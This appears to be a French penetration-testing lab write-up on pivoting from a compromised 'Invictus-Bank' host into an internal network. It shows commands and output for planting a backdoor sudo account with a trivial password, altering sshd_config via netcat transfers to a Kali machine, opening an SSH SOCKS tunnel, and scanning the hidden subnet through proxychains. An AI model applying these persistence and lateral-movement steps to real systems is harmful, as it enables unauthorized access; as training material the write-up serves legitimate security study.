# Pivotement

```
sudo useradd jojo 

echo "jojo:jojo" | sudo chpasswd

sudo usermod -aG sudo jojo


sudo sed -i '/AllowUsers/ s/$/ jojo/' /etc/ssh/sshd_config


sudo restart ssh
```

```
Ajout d'un compte pour maintenir son accès au système :
root@Invictus-Bank:/home/bthomson/Program# /usr/sbin/adduser clehen38
Adding user `clehen38' ...
Adding new group `clehen38' (1019) ...
Adding new user `clehen38' (1019) with group `clehen38' ...
Creating home directory `/home/clehen38' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for clehen38
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] 
root@Invictus-Bank:/home/bthomson/Program#




Ajout du droit de passer root :

root@Invictus-Bank:/home/bthomson/Program# usermod -aG sudo clehen38
root@Invictus-Bank:/home/bthomson/Program# 


Ajout du droit de se connecter en SSH dans le fichier de config d'openSSH :
Dans un premier temps : transfert du fichier sshd_config sur la Kali pour le modifier
Sur la machine .34 :
root@Invictus-Bank:/home/bthomson/Program/clehen38# cp /etc/ssh/sshd_config .
root@Invictus-Bank:/home/bthomson/Program/clehen38# nc -lvp 8038 < sshd_config 
Listening on [0.0.0.0] (family 0, port 8038)


Sur la kali : 
┌──(olivier㉿kali)-[~/Documents]
└─$ nc 192.168.10.34 8038 > sshd_config                                                                                                                                             
^C
┌──(olivier㉿kali)-[~/Documents]
└─$ ls                                                                                                                                                                                      
sshd_config



Modification du fichier :
┌──(olivier㉿kali)-[~/Documents]
└─$ vi sshd_config                                                                                                                                                                          
┌──(olivier㉿kali)-[~/Documents]
└─$ grep clehen38 sshd_config 
AllowUsers eblythe bthomson olivier clehen38
┌──(olivier㉿kali)-[~/Documents]




Transfert du fichier dans l'autre sens (de kali vers la .34) :
┌──(olivier㉿kali)-[~/Documents]
└─$ nc -lvp 8038 < sshd_config 
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8038
Ncat: Listening on 0.0.0.0:8038

root@Invictus-Bank:/home/bthomson/Program/clehen38# nc 192.168.10.10 8038 > sshd_config
root@Invictus-Bank:/home/bthomson/Program/clehen38# grep clehen38 sshd_config 
AllowUsers eblythe bthomson olivier clehen38
root@Invictus-Bank:/home/bthomson/Program/clehen38# cp sshd_config /etc/ssh/sshd_config
root@Invictus-Bank:/home/bthomson/Program/clehen38# 


Redémarrage du service ssh pour charger le nouveau fichier de config :
root@Invictus-Bank:/home/bthomson/Program/clehen38# restart ssh
ssh start/running, process 12222
root@Invictus-Bank:/home/bthomson/Program/clehen38# 



Ouverture du tunnel SSH depuis la Kali vers la machine .34 :
┌──(olivier㉿kali)-[~/Documents]
└─$ ssh -D 9038 -N clehen38@192.168.10.34                                                                                                                                                   
WARNING : Unauthorized access to this system is forbidden; InvictusBank Server
clehen38@192.168.10.34's password: 


Configuration de proxychains :
┌──(olivier㉿kali)-[~]
└─$ cp /etc/proxychains.conf .                                                                                                                                                              
┌──(olivier㉿kali)-[~]
└─$ vi proxychains.conf 
┌──(olivier㉿kali)-[~]
└─$ tail proxychains.conf                                                                                                                                                                   
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9038
┌──(olivier㉿kali)-[~]
└─$                  

Identification des réseaux locaux sur la .34 : 
root@Invictus-Bank:/home/bthomson/Program/clehen38# ifconfig 
eth0      Link encap:Ethernet  HWaddr 02:4b:3a:77:7a:a4  
          inet addr:192.168.10.34  Bcast:192.168.10.255  Mask:255.255.255.0
          inet6 addr: fe80::4b:3aff:fe77:7aa4/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:3672600 errors:0 dropped:0 overruns:0 frame:0
          TX packets:4276316 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:569855127 (569.8 MB)  TX bytes:1284060657 (1.2 GB)

eth1      Link encap:Ethernet  HWaddr 02:d9:e8:ce:22:14  
          inet addr:192.168.168.135  Bcast:192.168.168.255  Mask:255.255.255.0
          inet6 addr: fe80::d9:e8ff:fece:2214/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1475242 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1416692 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:286601211 (286.6 MB)  TX bytes:109610377 (109.6 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:187767 errors:0 dropped:0 overruns:0 frame:0
          TX packets:187767 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:11155723 (11.1 MB)  TX bytes:11155723 (11.1 MB)

root@Invictus-Bank:/home/bthomson/Program/clehen38# 
root@Invictus-Bank:/home/bthomson/Program/clehen38# netstat -rn
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         192.168.168.1   0.0.0.0         UG        0 0          0 eth1
192.168.10.0    0.0.0.0         255.255.255.0   U         0 0          0 eth0
192.168.168.0   0.0.0.0         255.255.255.0   U         0 0          0 eth1



Scan du réseau distant depuis Kali :
┌──(olivier㉿kali)-[~]
└─$ proxychains -f proxychains.conf nmap -sP 192.168.168.0/24
[proxychains] config file found: proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-14 19:55 UTC
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.1:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.4:80 <--socket error or timeout!
...
...
...

Le scan ping est transformé en une tentative d'ouverture TCP port 80 car l'icmp ne passe pas par proxychains.
On va maintenant pouvoir vérifier la table arp si une machine est réelement présente


Identification des machines présentes sur le réseau distant :
root@Invictus-Bank:/home/bthomson/Program/clehen38# arp -a
? (192.168.168.60) at <incomplete> on eth1
? (192.168.10.13) at <incomplete> on eth0
? (192.168.168.23) at <incomplete> on eth1
? (192.168.10.32) at <incomplete> on eth0
? (192.168.168.57) at <incomplete> on eth1
? (192.168.10.14) at <incomplete> on eth0
? (192.168.168.20) at <incomplete> on eth1
? (192.168.10.37) at <incomplete> on eth0
? (192.168.168.54) at <incomplete> on eth1
? (192.168.10.3) at <incomplete> on eth0
? (192.168.168.17) at <incomplete> on eth1
? (192.168.10.38) at <incomplete> on eth0
? (192.168.168.51) at <incomplete> on eth1
? (192.168.168.14) at <incomplete> on eth1
? (192.168.10.4) at <incomplete> on eth0
? (192.168.10.59) at <incomplete> on eth0
...
...

Trop de résultats. On va filtrer la sortie pour enlever tout ce qui est marqué comme “incomplete”
root@Invictus-Bank:/home/bthomson/Program/clehen38# arp -a | grep -v inc
? (192.168.10.10) at 02:7a:c4:a5:65:a6 [ether] on eth0
? (192.168.10.1) at 02:9c:ce:2b:62:fe [ether] on eth0
? (192.168.10.2) at 02:9c:ce:2b:62:fe [ether] on eth0
? (192.168.168.1) at 02:a5:bc:ae:86:de [ether] on eth1
? (192.168.168.180) at 02:14:99:63:bd:d4 [ether] on eth1
? (192.168.10.184) at 02:d4:ad:a4:81:62 [ether] on eth0
root@Invictus-Bank:/home/bthomson/Program/clehen38# 

On identifie la machine 192.168.168.180

Scan des ports sur la machine distante :
┌──(olivier㉿kali)-[~]
└─$ proxychains -f proxychains.conf nmap -sT -PN 192.168.168.180  
........
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:34573 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:81 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:6839 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:16000 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:1719 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:3784 <--socket error or timeout!
Nmap scan report for 192.168.168.180
Host is up (0.0014s latency).
All 1000 scanned ports on 192.168.168.180 are closed

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds

Aucun port ouvert sur les 1000 ports les plus connus. On va élargir et scanner la totalité des ports TCP

──(olivier㉿kali)-[~]
└─$ proxychains -f proxychains.conf nmap -sT -p- 192.168.168.180 
...
...
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:19181 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:32511 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:4820 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:53420 <--socket error or timeout!
Nmap scan report for 192.168.168.180
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 92.11 seconds


Scan de la version sur le port ouvert de la machine distante :
┌──(olivier㉿kali)-[~]
└─$ proxychains -f proxychains.conf nmap -sV -p 3632 192.168.168.180                                                                                                                       
[proxychains] config file found: proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-14 20:08 UTC
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:3632  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:3632  ...  OK
Nmap scan report for 192.168.168.180
Host is up (0.0014s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds



Tentative de connexion ssh :
──(olivier㉿kali)-[~]
└─$ proxychains -f proxychains.conf ssh -p 3632 192.168.168.180
[proxychains] config file found: proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:9038  ...  192.168.168.180:3632  ...  OK
The authenticity of host '[192.168.168.180]:3632 ([192.168.168.180]:3632)' can't be established.
ECDSA key fingerprint is SHA256:HpXYPwVkKFUV+iCcEgXz+/RKfZx73zE65Qrl6z7A7Vk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.168.180]:3632' (ECDSA) to the list of known hosts.
/$$$$$$                      /$$             /$$                         /$$$$$$$                      /$$      
|_  $$_/                     |__/            | $$                        | $$__  $$                    | $$      
  | $$   /$$$$$$$  /$$    /$$ /$$  /$$$$$$$ /$$$$$$   /$$   /$$  /$$$$$$$| $$  \ $$  /$$$$$$  /$$$$$$$ | $$   /$$
  | $$  | $$__  $$|  $$  /$$/| $$ /$$_____/|_  $$_/  | $$  | $$ /$$_____/| $$$$$$$  |____  $$| $$__  $$| $$  /$$/
  | $$  | $$  \ $$ \  $$/$$/ | $$| $$        | $$    | $$  | $$|  $$$$$$ | $$__  $$  /$$$$$$$| $$  \ $$| $$$$$$/ 
  | $$  | $$  | $$  \  $$$/  | $$| $$        | $$ /$$| $$  | $$ \____  $$| $$  \ $$ /$$__  $$| $$  | $$| $$_  $$ 
 /$$$$$$| $$  | $$   \  $/   | $$|  $$$$$$$  |  $$$$/|  $$$$$$/ /$$$$$$$/| $$$$$$$/|  $$$$$$$| $$  | $$| $$ \  $$
|______/|__/  |__/    \_/    |__/ \_______/   \___/   \______/ |_______/ |_______/  \_______/|__/  |__/|__/  \__/

olivier@192.168.168.180's password: 
Permission denied, please try again.
olivier@192.168.168.180's password: 
Permission denied, please try again.
olivier@192.168.168.180's password: 
olivier@192.168.168.180: Permission denied (publickey,password).
┌──(olivier㉿kali)-[~]
└─$           

Nous n'avons pas le login/pass. Nous devons les chercher sur la machine que nous avons laissé de côté le premier jour : 192.168.10.184
```
